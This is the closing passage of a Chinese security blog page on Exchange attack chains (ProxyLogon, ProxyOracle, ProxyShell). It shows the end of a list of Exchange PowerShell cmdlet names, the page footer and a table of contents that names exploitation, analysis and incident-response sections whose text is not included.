class="hljs-built_in">Set-MailboxSpellingConfiguration</span><br><span class="hljs-built_in">Set-MailUser</span><br><span class="hljs-built_in">Set-SiteMailbox</span><br><span class="hljs-built_in">Set-SweepRule</span><br><span class="hljs-built_in">Set-TextMessagingAccount</span><br><span class="hljs-built_in">Set-UMCallAnsweringRule</span><br><span class="hljs-built_in">Set-UMMailbox</span><br><span class="hljs-built_in">Set-UMMailboxConfiguration</span><br><span class="hljs-built_in">Set-UMMailboxPIN</span><br><span class="hljs-built_in">Set-UnifiedAuditSetting</span><br><span class="hljs-built_in">Set-User</span><br><span class="hljs-built_in">Set-UserPhoto</span><br><span class="hljs-built_in">Start-AuditAssistant</span><br><span class="hljs-built_in">Start-UMPhoneSession</span><br><span class="hljs-built_in">Stop-UMPhoneSession</span><br><span class="hljs-built_in">Test-SiteMailbox</span><br><span class="hljs-built_in">Update-SiteMailbox</span><br><span class="hljs-built_in">Exit-PSSession</span><br><span class="hljs-built_in">Get-FormatData</span><br><span class="hljs-built_in">Measure-Object</span><br><span class="hljs-built_in">Out-Default</span><br><span class="hljs-built_in">Select-Object</span><br></code></pre></td></tr></table></figure>


      </section>
      <section class="extra">
        
          <ul class="copyright">
  
    <li><strong>本文作者：</strong>K1ng</li>
    <li><strong>本文链接：</strong><a href="http://blog.seck1ng.com/2022/03/09/Exchange-%E6%94%BB%E5%87%BB%E9%93%BE/index.html" title="http:&#x2F;&#x2F;blog.seck1ng.com&#x2F;2022&#x2F;03&#x2F;09&#x2F;Exchange-%E6%94%BB%E5%87%BB%E9%93%BE&#x2F;index.html">http:&#x2F;&#x2F;blog.seck1ng.com&#x2F;2022&#x2F;03&#x2F;09&#x2F;Exchange-%E6%94%BB%E5%87%BB%E9%93%BE&#x2F;index.html</a></li>
    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
  
</ul>
        
        
          <section class="donate">
  <div id="qrcode-donate">
    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
  </div>
  <div class="icon">
    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
  </div>
</section>
        
        
        
  <nav class="nav">
    <a href="/2022/05/20/svchost%20%E7%9A%84%E7%A5%9E%E7%A7%98%E9%9D%A2%E7%BA%B1/"><i class="iconfont iconleft"></i>一文读懂svchost：被黑客“玩坏”的神秘进程</a>
    <a href="/2022/03/09/%E6%BA%AF%E6%BA%90%E5%A4%A7%E6%B3%95%E5%A5%BD/"><i class="iconfont iconright"></i></a>
  </nav>

      </section>
      
    </section>
  </div>
</article></div>
      <div class="col-xl-3">
        
          
  <aside class="toc-wrap">
    <h3 class="toc-title">文章目录：</h3>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81Exchange-%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-text">一、Exchange 攻击链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81ProxyLogon"><span class="toc-text">一、ProxyLogon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ProxyOracle"><span class="toc-text">二、ProxyOracle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81ProxyShell"><span class="toc-text">三、ProxyShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81ProxyShell-%E5%88%A9%E7%94%A8"><span class="toc-text">1、ProxyShell 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-text">（1）漏洞扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E8%8E%B7%E5%8F%96-LegacyDN"><span class="toc-text">（2）获取 LegacyDN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E8%8E%B7%E5%8F%96-SID"><span class="toc-text">（3）获取 SID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%8E%B7%E5%8F%96-Powershell-%E6%8E%A5%E5%8F%A3"><span class="toc-text">（4）获取 Powershell 接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E6%8A%95%E9%80%92-Webshell-%E8%BD%BD%E8%8D%B7"><span class="toc-text">（5）投递 Webshell 载荷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6%E5%AE%8C%E6%88%90%E5%86%99-webshell"><span class="toc-text">（6）导出邮件完成写 webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81ProxyShell-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">2、ProxyShell 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89SSRF%EF%BC%88CVE-2021-34473%EF%BC%89"><span class="toc-text">（1）SSRF（CVE-2021-34473）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89Exchange-PowerShell%EF%BC%88CVE-2021-34523%EF%BC%89"><span class="toc-text">（2）Exchange PowerShell（CVE-2021-34523）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E5%86%99-Webshell%EF%BC%88CVE-2021-31207%EF%BC%89"><span class="toc-text">（4）写 Webshell（CVE-2021-31207）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81ProxyShell-%E5%BA%94%E6%80%A5%E5%88%86%E6%9E%90"><span class="toc-text">3、ProxyShell 应急分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Exchange-IIS-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-text">（1）Exchange IIS 日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-text">（2）应用程序日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89Exchnage-%E5%AE%A1%E8%AE%A1%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-text">（3）Exchnage 审计日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89webshell-%E6%8E%92%E6%9F%A5"><span class="toc-text">（4）webshell 排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5"><span class="toc-text">（5）配置文件排查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">4、漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">5、参考链接</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E5%BD%95-Exchange-Powershell-%E5%91%BD%E4%BB%A4"><span class="toc-text">附录. Exchange Powershell 命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81cmdlet-%E6%9D%83%E9%99%90"><span class="toc-text">1、cmdlet 权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%99%AE%E9%80%9A%E8%B4%A6%E6%88%B7"><span class="toc-text">2、普通账户</span></a></li></ol></li></ol>
  </aside>

        
      </div>
    </div>
  </div>
</main>
  

<footer class="footer">
  <div class="footer-social"><a 
        href="tencent://message/?Menu=yes&uin=894519210 "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#12B7F5'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconQQ "></i>
      </a><a 
        href="javascript:; "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#09BB07'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconwechat-fill "></i>
      </a><a 
        href="https://www.instagram.com/izhaoo/ "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#DA2E76'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconinstagram "></i>
      </a><a 
        href="https://github.com/zhaoo "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#9f7be1'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  icongithub-fill "></i>
      </a><a 
        href="mailto:izhaoo@163.com "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color=#FF3B00" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconmail"></i>
      </a></div>
  
    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
  
</footer>
  
      <div class="fab fab-plus">
    <i class="iconfont iconplus"></i>
  </div>
  
  
  
  <div class="fab fab-up">
    <i class="iconfont iconcaret-up"></i>
  </div>
  
  
  
    
<script src="/js/color-mode.js"></script>

  
  
</body>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>





  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>




  
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>






  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>




<script src="/js/utils.js"></script>
<script src="/js/script.js"></script>







  <script>
    (function () {
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>













</html>